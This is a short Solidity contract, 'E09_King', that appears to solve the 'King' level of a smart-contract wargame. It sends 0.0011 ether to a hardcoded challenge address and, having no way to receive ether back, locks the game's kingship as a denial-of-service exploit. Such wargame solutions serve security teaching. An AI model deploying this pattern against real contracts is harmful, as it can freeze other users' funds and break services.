// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract E09_King {
    address payable TARGET = payable(0x9EB1C7E6311D0d30ead5A94C0FD13a035034b711);

    constructor() payable {
    }

    function pay() external returns(bool) {
        (bool success, ) = TARGET.call{value:0.0011 ether}("");
        return success;
    }
}

